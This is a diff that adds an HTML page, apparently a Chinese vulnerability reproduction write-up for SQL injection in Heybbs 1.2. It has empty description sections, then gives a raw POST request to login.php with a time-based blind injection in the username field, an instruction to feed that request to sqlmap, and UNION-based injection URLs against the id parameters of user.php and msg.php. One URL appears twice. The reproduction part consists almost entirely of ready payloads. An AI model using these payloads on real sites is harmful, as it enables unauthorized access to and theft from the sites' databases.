@@ -1,0 +1,32 @@
+﻿<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+	<head>
+		<meta http-equiv="Content-Type" content="text/html; charset=utf-8" /><title>
+		</title>
+		<style type="text/css">
+			.csAD577193{text-align:left;text-indent:0pt;margin:24pt 0pt 0pt 0pt;page-break-after:avoid;page-break-inside:avoid}
+			.csDE05BCC{color:#4F81BD;background-color:transparent;font-family:Calibri;font-size:16pt;font-weight:bold;font-style:normal;}
+			.csECDA2D3{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:16pt;font-weight:bold;font-style:normal;}
+			.cs868C439D{text-align:left;text-indent:0pt;margin:10pt 0pt 0pt 0pt;page-break-after:avoid;page-break-inside:avoid}
+			.cs83F14626{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:14pt;font-weight:bold;font-style:normal;}
+			.cs40DD2BC9{text-align:left;text-indent:0pt;margin:9pt 0pt 9pt 0pt}
+			.cs8926E06{color:#000000;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:normal;font-style:normal;}
+			.csE3F655E4{color:#000000;background-color:transparent;font-family:Microsoft YaHei UI;font-size:12pt;font-weight:bold;font-style:normal;}
+			.cs5BEC2C28{color:#000000;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:bold;font-style:normal;}
+			.cs3A447A38{text-align:left;text-indent:0pt;margin:0pt 0pt 10pt 0pt}
+			.cs9FB05234{color:#000000;background-color:transparent;font-family:Consolas;font-size:11pt;font-weight:normal;font-style:normal;}
+			.cs6FD73CFB{text-align:left;text-indent:0pt;margin:5pt 24pt 5pt 24pt}
+			.cs9C1B1871{color:#000000;background-color:transparent;font-family:Microsoft YaHei UI;font-size:12pt;font-weight:normal;font-style:normal;}
+		</style>
+	</head>
+	<body>
+		<h1 class="csAD577193">
+			<a name="heybbs-12-sql注入漏洞"><span class="csDE05BCC">Heybbs 1.2 sql</span><span class="csECDA2D3">注入漏洞</span></a></h1>
+		<h2 class="cs868C439D">
+			<a name="一漏洞简介"><span class="cs83F14626">一、漏洞简介</span></a></h2>
+		<h2 class="cs868C439D">
+			<a name="二漏洞影响"><span class="cs83F14626">二、漏洞影响</span></a></h2>
+		<p class="cs40DD2BC9"><span class="cs8926E06">Heybb 1.2</span></p><h2 class="cs868C439D">
+			<a name="三复现过程"><span class="cs83F14626">三、复现过程</span></a></h2>
+		<p class="cs40DD2BC9"><span class="csE3F655E4">第一处注入存在于</span><span class="cs5BEC2C28">login.php</span><span class="csE3F655E4">文件的</span><span class="cs5BEC2C28">username</span><span class="csE3F655E4">参数处</span></p><p class="cs3A447A38"><span class="cs9FB05234">POST /php/login.php HTTP/1.1</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Host: www.0-sec.org</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Content-Length: 98</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Cache-Control: max-age=0</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Upgrade-Insecure-Requests: 1</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Origin: http://www.0-sec.org</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Content-Type: application/x-www-form-urlencoded</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.135 Safari/537.36</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Referer: http://www.0-sec.org/login.php</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Accept-Encoding: gzip, deflate</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Accept-Language: zh-CN,zh;q=0.9</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Cookie: PHPSESSID=qmpkek4l3ojr30gtodf6nj4hp4</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Connection: close</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">username=123123&#39; and (select 1 from (select(sleep(5)))accn) AND &#39;1&#39;=&#39;1&amp;password=123123&amp;verify=h4ir</span></p><p class="cs6FD73CFB"><span class="cs9C1B1871">将</span><span class="cs8926E06">username</span><span class="cs9C1B1871">标</span><span class="cs8926E06">*</span><span class="cs9C1B1871">放入</span><span class="cs8926E06">sqlmap -r</span></p><p class="cs40DD2BC9"><span class="csE3F655E4">第二处注入存在于</span><span class="cs5BEC2C28">user.php</span><span class="csE3F655E4">文件</span><span class="cs5BEC2C28">id</span><span class="csE3F655E4">参数处</span></p><p class="cs40DD2BC9"><span class="cs8926E06">Eg:</span></p><p class="cs40DD2BC9"><span class="cs9FB05234">http://www.0-sec.org/user.php?id=177 and 1=2 union select 1) ,user(),3,4,5,6,7,8,9,10</span></p><p class="cs40DD2BC9"><span class="csE3F655E4">第三处注入存在于</span><span class="cs5BEC2C28">msg.php</span><span class="csE3F655E4">文件</span><span class="cs5BEC2C28">id</span><span class="csE3F655E4">参数处</span></p><p class="cs40DD2BC9"><span class="cs8926E06">Eg:</span></p><p class="cs40DD2BC9"><span class="cs9FB05234">http://www.0-sec.org/msg.php?id=1 and 1=2 union select 1) ,2,3,user(),5,6,7,8,9,10,11,12</span></p><p class="cs40DD2BC9"><span class="cs8926E06">Eg:</span></p><p class="cs40DD2BC9"><span class="cs9FB05234">http://www.0-sec.org/msg.php?id=1 and 1=2 union select 1) ,2,3,user(),5,6,7,8,9,10,11,12</span></p></body>
+</html>
